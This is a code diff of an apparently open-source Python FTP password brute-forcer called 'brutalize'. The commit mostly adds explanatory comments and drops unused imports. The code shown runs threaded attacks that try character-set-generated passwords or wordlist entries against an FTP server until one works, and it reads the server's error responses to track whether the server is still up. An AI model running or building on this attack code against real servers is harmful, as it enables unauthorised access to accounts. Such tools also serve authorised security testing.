@@ -35,8 +35,7 @@
 # If you find bugs, have a request, see something you would like to improve, or have questions,
 # feel free to submit changes, or ask questions on github.com/indeedion/brutalize 
 
-import socket
-import re
+#Imports
 import sys
 import time
 import argparse
@@ -107,6 +106,7 @@ def print_screen():
             str(m_vars.thrds) + "]")
     print("=========================================================")
 
+#attempts to connect to server with bad credentials to see what error comes back
 def get_server_response(ip):
     try:
         ftp = ftplib.FTP(ip)
@@ -115,8 +115,10 @@ def get_server_response(ip):
 
     except ftplib.all_errors as e:
         if str(e).split(None, 1)[0] == "[Errno":
+            #this error happens if server is down, and the response comes from ftplib
             m_vars.last_error_response = str(e).split(None, 4)[1].split("]", 1)[0]
         else:
+            #these errors are server responses
             m_vars.last_error_response = str(e).split(None, 1)[0]
         return 
 
@@ -146,10 +148,11 @@ def main(args):
     #print header
     print_screen()
 
-    #global variables
+    #non-optional global variables
     if args.host:m_vars.address = args.host
     if args.username:m_vars.user = args.username
-
+    
+    #optional global variables
     if args.threads:m_vars.thrds = int(args.threads)
     if args.pause:m_vars.pause = float(args.pause)
     if args.verbose:m_vars.verb = True
@@ -174,8 +177,9 @@ def main(args):
         m_vars.thrds = threads_allowed(m_vars.address)
         print("threads allowed: " + str(m_vars.thrds)) 
 
+    #run brute-force attack
     if args.wordlist == None:
-        #run brute-force attack
+        #iterate through default or specified password-lengths
         for i in range(m_vars.min_length, m_vars.max_length + 1):
             if m_vars.pass_found: break
                 
@@ -184,48 +188,62 @@ def main(args):
                 print("Connection refused, server down?")
                 break
             
+            #iterate through passwords generated from charset
             for p in itertools.product(m_vars.charset, repeat=i):
                 if m_vars.pass_found: break
-
+                
+                #joins generated characters into one string
                 passw = ''.join(p)
                 m_vars.count += 1
                 
+                #updates screen output
                 print_screen()
+
+                #prints output to UI for user to read
                 print("Attempt: " + str(m_vars.count) + " candidate: " + passw + " last response: " +
                         m_vars.last_error_response)
                 
+                #lets existing threads catch up if upper limit of threads is reached
                 if m_vars.thrdcnt == m_vars.thrds:
                     m_vars.thrdcnt = 0
                     wait(threads)
-             
+                
+                #creates new thread
                 thread = threading.Thread(target=crack, args=[passw])
                 thread.start()
                 threads.append(thread)
                 m_vars.thrdcnt += 1
                 time.sleep(m_vars.pause)
+    
+    #run dictionary attack
     else:
-        #run dictionary attack
+        #iterate through specified wordlist until password is found or list ends
         with open(args.wordlist) as wlist:
             for passw in wlist:
                 
-
                 #check if connection to server is alive
                 if m_vars.last_error_response == '111':    
                     print("Connection refused, server down?")
                     break
                 if m_vars.pass_found: break
                 
+                #strips linebreak characters from string
                 passw = passw.rstrip()
-
                 m_vars.count += 1
+
+                #updates screen output
                 print_screen()
+
+                #prints output to user
                 print("Attempt: " + str(m_vars.count) + " Candidate: " + passw + " last response: "
                         + m_vars.last_error_response)
-
+                
+                #wait for threads to catch up if upper limit is reached
                 if m_vars.thrdcnt == m_vars.thrds:
                     m_vars.thrdcnt = 0
                     wait(threads)
-
+                
+                #create and start new thread
                 thread = threading.Thread(target=crack, args=[passw])
                 thread.start()
                 threads.append(thread)
@@ -245,7 +263,9 @@ def main(args):
     print("Done")
     return 0
 
-
+#checks if code is run as a standalone program, or if it is imported into another project.
+#if it is part of another project, main function will not be called.
+#also defines cmd arguments to check for, and displays help if no arguments were passed
 if __name__ == "__main__":
     
     #Parser Arguments
